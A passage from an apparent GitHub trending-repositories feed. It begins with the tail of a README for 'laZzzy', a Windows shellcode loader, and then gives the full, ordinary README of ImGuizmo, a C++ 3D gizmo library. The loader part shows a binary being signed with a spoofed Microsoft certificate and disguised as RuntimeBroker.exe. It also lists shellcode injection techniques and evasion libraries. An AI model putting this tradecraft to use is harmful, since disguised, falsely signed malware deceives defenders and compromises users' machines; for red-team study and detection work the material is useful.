[*] Compiled executable:        C:\MalDev\laZzzy\loader\x64\Release\laZzzy.exe&#xA;&#xA;[+] Signing binary with spoofed cert&#xA;        [*] Domain:                     www.microsoft.com&#xA;        [*] Version:                    2&#xA;        [*] Serial:                     33:00:59:f8:b6:da:86:89:70:6f:fa:1b:d9:00:00:00:59:f8:b6&#xA;        [*] Subject:                    /C=US/ST=WA/L=Redmond/O=Microsoft Corporation/CN=www.microsoft.com&#xA;        [*] Issuer:                     /C=US/O=Microsoft Corporation/CN=Microsoft Azure TLS Issuing CA 06&#xA;        [*] Not Before:                 October 04 2022&#xA;        [*] Not After:                  September 29 2023&#xA;        [*] PFX file:                   C:\MalDev\laZzzy\output\www.microsoft.com.pfx&#xA;&#xA;[+] All done!&#xA;        [*] Output file:                C:\MalDev\laZzzy\output\RuntimeBroker.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Libraries Used&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/kokke/tiny-AES-c&#34;&gt;kokke/tiny-AES-c&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/skadro-official/skCrypter&#34;&gt;skadro-official/skCrypter&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/JustasMasiulis/lazy_importer&#34;&gt;JustasMasiulis/lazy_importer&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/JustasMasiulis/inline_syscall&#34;&gt;JustasMasiulis/inline_syscall&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Shellcode Execution Techniques&lt;/h3&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Early-bird APC Queue &lt;em&gt;(requires sacrificial process)&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;Thread Hijacking &lt;em&gt;(requires sacrificial process)&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;KernelCallbackTable &lt;em&gt;(requires sacrificial process that has a GUI)&lt;/em&gt;&lt;/li&gt; &#xA; &lt;li&gt;Section View Mapping&lt;/li&gt; &#xA; &lt;li&gt;Thread Suspension&lt;/li&gt; &#xA; &lt;li&gt;LineDDA Callback&lt;/li&gt; &#xA; &lt;li&gt;EnumSystemGeoID Callback&lt;/li&gt; &#xA; &lt;li&gt;Fiber Local Storage (FLS) Callback&lt;/li&gt; &#xA; &lt;li&gt;SetTimer&lt;/li&gt; &#xA; &lt;li&gt;Clipboard&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h3&gt;Notes:&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Only works on &lt;strong&gt;Windows x64&lt;/strong&gt;&lt;/li&gt; &#xA; &lt;li&gt;Debugging only works on &lt;strong&gt;Release&lt;/strong&gt; mode&lt;/li&gt; &#xA; &lt;li&gt;Sometimes, &lt;strong&gt;KernelCallbackTable&lt;/strong&gt; doesn&#39;t work on the first run but will eventually work afterward&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Credits/References&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Authors of the libraries used&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;http://undocumented.ntinternals.net/&#34;&gt;http://undocumented.ntinternals.net/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://doxygen.reactos.org/index.html&#34;&gt;https://doxygen.reactos.org/index.html&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/processhacker/phnt&#34;&gt;https://github.com/processhacker/phnt&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.vergiliusproject.com/&#34;&gt;https://www.vergiliusproject.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.ired.team/&#34;&gt;https://www.ired.team/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/snovvcrash/DInjector&#34;&gt;https://github.com/snovvcrash/DInjector&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/aahmad097/AlternativeShellcodeExec&#34;&gt;https://github.com/aahmad097/AlternativeShellcodeExec&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/paranoidninja/CarbonCopy&#34;&gt;https://github.com/paranoidninja/CarbonCopy&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>CedricGuillemet/ImGuizmo</title>
    <updated>2022-11-24T01:32:53Z</updated>
    <id>tag:github.com,2022-11-24:/CedricGuillemet/ImGuizmo</id>
    <link href="https://github.com/CedricGuillemet/ImGuizmo" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Immediate mode 3D gizmo for scene editing and other controls based on Dear Imgui&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ImGuizmo&lt;/h1&gt; &#xA;&lt;p&gt;Latest stable tagged version is 1.83. Current master version is 1.84 WIP.&lt;/p&gt; &#xA;&lt;p&gt;What started with the gizmo is now a collection of dear imgui widgets and more advanced controls.&lt;/p&gt; &#xA;&lt;h2&gt;Guizmos&lt;/h2&gt; &#xA;&lt;h3&gt;ImViewGizmo&lt;/h3&gt; &#xA;&lt;p&gt;Manipulate view orientation with 1 single line of code&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;http://i.imgur.com/7UVcyDd.gif&#34; alt=&#34;Image of ImViewGizmo&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;ImGuizmo&lt;/h3&gt; &#xA;&lt;p&gt;ImGizmo is a small (.h and .cpp) library built ontop of Dear ImGui that allow you to manipulate(Rotate &amp;amp; translate at the moment) 4x4 float matrices. No other dependancies. Coded with Immediate Mode (IM) philosophy in mind.&lt;/p&gt; &#xA;&lt;p&gt;Built against DearImgui 1.53WIP&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;http://i.imgur.com/y4mcVoT.gif&#34; alt=&#34;Image of Rotation&#34;&gt; &lt;img src=&#34;http://i.imgur.com/o8q8iHq.gif&#34; alt=&#34;Image of Translation&#34;&gt; &lt;img src=&#34;http://i.imgur.com/3Ez5LBr.gif&#34; alt=&#34;Image of Bounds&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;There is now a sample for Win32/OpenGL ! With a binary in bin directory. &lt;img src=&#34;https://i.imgur.com/nXlzyqD.png&#34; alt=&#34;Image of Sample&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;ImSequencer&lt;/h3&gt; &#xA;&lt;p&gt;A WIP little sequencer used to edit frame start/end for different events in a timeline. &lt;img src=&#34;http://i.imgur.com/BeyNwCn.png&#34; alt=&#34;Image of Rotation&#34;&gt; Check the sample for the documentation. More to come...&lt;/p&gt; &#xA;&lt;h3&gt;Graph Editor&lt;/h3&gt; &#xA;&lt;p&gt;Nodes + connections. Custom draw inside nodes is possible with the delegate system in place. &lt;img src=&#34;https://raw.githubusercontent.com/CedricGuillemet/ImGuizmo/master/Images/nodeeditor.jpg&#34; alt=&#34;Image of GraphEditor&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;API doc&lt;/h3&gt; &#xA;&lt;p&gt;Call BeginFrame right after ImGui_XXXX_NewFrame();&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;void BeginFrame();&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;return true if mouse cursor is over any gizmo control (axis, plan or screen component)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;bool IsOver();**&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;return true if mouse IsOver or if the gizmo is in moving state&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;bool IsUsing();**&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;enable/disable the gizmo. Stay in the state until next call to Enable. gizmo is rendered with gray half transparent color when disabled&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;void Enable(bool enable);**&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;helper functions for manualy editing translation/rotation/scale with an input float translation, rotation and scale float points to 3 floats each Angles are in degrees (more suitable for human editing) example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt; float matrixTranslation[3], matrixRotation[3], matrixScale[3];&#xA; ImGuizmo::DecomposeMatrixToComponents(gizmoMatrix.m16, matrixTranslation, matrixRotation, matrixScale);&#xA; ImGui::InputFloat3(&#34;Tr&#34;, matrixTranslation, 3);&#xA; ImGui::InputFloat3(&#34;Rt&#34;, matrixRotation, 3);&#xA; ImGui::InputFloat3(&#34;Sc&#34;, matrixScale, 3);&#xA; ImGuizmo::RecomposeMatrixFromComponents(matrixTranslation, matrixRotation, matrixScale, gizmoMatrix.m16);&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;These functions have some numerical stability issues for now. Use with caution.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;void DecomposeMatrixToComponents(const float *matrix, float *translation, float *rotation, float *scale);&#xA;void RecomposeMatrixFromComponents(const float *translation, const float *rotation, const float *scale, float *matrix);**&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Render a cube with face color corresponding to face normal. Usefull for debug/test&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;void DrawCube(const float *view, const float *projection, float *matrix);**&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Call it when you want a gizmo Needs view and projection matrices. Matrix parameter is the source matrix (where will be gizmo be drawn) and might be transformed by the function. Return deltaMatrix is optional. snap points to a float[3] for translation and to a single float for scale or rotation. Snap angle is in Euler Degrees.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;    enum OPERATION&#xA;    {&#xA;        TRANSLATE,&#xA;        ROTATE,&#xA;        SCALE&#xA;    };&#xA;&#xA;    enum MODE&#xA;    {&#xA;        LOCAL,&#xA;        WORLD&#xA;    };&#xA;&#xA;void Manipulate(const float *view, const float *projection, OPERATION operation, MODE mode, float *matrix, float *deltaMatrix = 0, float *snap = 0);**&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;ImGui Example&lt;/h3&gt; &#xA;&lt;p&gt;Code for :&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;http://i.imgur.com/GL5flN1.png&#34; alt=&#34;Image of dialog&#34;&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-C++&#34;&gt;void EditTransform(const Camera&amp;amp; camera, matrix_t&amp;amp; matrix)&#xA;{&#xA;    static ImGuizmo::OPERATION mCurrentGizmoOperation(ImGuizmo::ROTATE);&#xA;    static ImGuizmo::MODE mCurrentGizmoMode(ImGuizmo::WORLD);&#xA;    if (ImGui::IsKeyPressed(90))&#xA;        mCurrentGizmoOperation = ImGuizmo::TRANSLATE;&#xA;    if (ImGui::IsKeyPressed(69))&#xA;        mCurrentGizmoOperation = ImGuizmo::ROTATE;&#xA;    if (ImGui::IsKeyPressed(82)) // r Key&#xA;        mCurrentGizmoOperation = ImGuizmo::SCALE;&#xA;    if (ImGui::RadioButton(&#34;Translate&#34;, mCurrentGizmoOperation == ImGuizmo::TRANSLATE))&#xA;        mCurrentGizmoOperation = ImGuizmo::TRANSLATE;&#xA;    ImGui::SameLine();&#xA;    if (ImGui::RadioButton(&#34;Rotate&#34;, mCurrentGizmoOperation == ImGuizmo::ROTATE))&#xA;        mCurrentGizmoOperation = ImGuizmo::ROTATE;&#xA;    ImGui::SameLine();&#xA;    if (ImGui::RadioButton(&#34;Scale&#34;, mCurrentGizmoOperation == ImGuizmo::SCALE))&#xA;        mCurrentGizmoOperation = ImGuizmo::SCALE;&#xA;    float matrixTranslation[3], matrixRotation[3], matrixScale[3];&#xA;    ImGuizmo::DecomposeMatrixToComponents(matrix.m16, matrixTranslation, matrixRotation, matrixScale);&#xA;    ImGui::InputFloat3(&#34;Tr&#34;, matrixTranslation, 3);&#xA;    ImGui::InputFloat3(&#34;Rt&#34;, matrixRotation, 3);&#xA;    ImGui::InputFloat3(&#34;Sc&#34;, matrixScale, 3);&#xA;    ImGuizmo::RecomposeMatrixFromComponents(matrixTranslation, matrixRotation, matrixScale, matrix.m16);&#xA;&#xA;    if (mCurrentGizmoOperation != ImGuizmo::SCALE)&#xA;    {&#xA;        if (ImGui::RadioButton(&#34;Local&#34;, mCurrentGizmoMode == ImGuizmo::LOCAL))&#xA;            mCurrentGizmoMode = ImGuizmo::LOCAL;&#xA;        ImGui::SameLine();&#xA;        if (ImGui::RadioButton(&#34;World&#34;, mCurrentGizmoMode == ImGuizmo::WORLD))&#xA;            mCurrentGizmoMode = ImGuizmo::WORLD;&#xA;    }&#xA;    static bool useSnap(false);&#xA;    if (ImGui::IsKeyPressed(83))&#xA;        useSnap = !useSnap;&#xA;    ImGui::Checkbox(&#34;&#34;, &amp;amp;useSnap);&#xA;    ImGui::SameLine();&#xA;    vec_t snap;&#xA;    switch (mCurrentGizmoOperation)&#xA;    {&#xA;    case ImGuizmo::TRANSLATE:&#xA;        snap = config.mSnapTranslation;&#xA;        ImGui::InputFloat3(&#34;Snap&#34;, &amp;amp;snap.x);&#xA;        break;&#xA;    case ImGuizmo::ROTATE:&#xA;        snap = config.mSnapRotation;&#xA;        ImGui::InputFloat(&#34;Angle Snap&#34;, &amp;amp;snap.x);&#xA;        break;&#xA;    case ImGuizmo::SCALE:&#xA;        snap = config.mSnapScale;&#xA;        ImGui::InputFloat(&#34;Scale Snap&#34;, &amp;amp;snap.x);&#xA;        break;&#xA;    }&#xA;    ImGuiIO&amp;amp; io = ImGui::GetIO();&#xA;    ImGuizmo::SetRect(0, 0, io.DisplaySize.x, io.DisplaySize.y);&#xA;    ImGuizmo::Manipulate(camera.mView.m16, camera.mProjection.m16, mCurrentGizmoOperation, mCurrentGizmoMode, matrix.m16, NULL, useSnap ? &amp;amp;snap.x : NULL);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Install&lt;/h2&gt; &#xA;&lt;p&gt;ImGuizmo can be installed via &lt;a href=&#34;https://github.com/microsoft/vcpkg&#34;&gt;vcpkg&lt;/a&gt; and used cmake&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;vcpkg install imguizmo&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://raw.githubusercontent.com/CedricGuillemet/ImGuizmo/master/vcpkg-example&#34;&gt;vcpkg example&lt;/a&gt; for more details&lt;/p&gt; &#xA;&lt;h2&gt;License&lt;/h2&gt; &#xA;&lt;p&gt;ImGuizmo is licensed under the MIT License, see &lt;a href=&#34;https://raw.githubusercontent.com/CedricGuillemet/ImGuizmo/master/LICENSE&#34;&gt;LICENSE&lt;/a&gt; for more information.&lt;/p&gt;</summary>
  </entry>
</feed>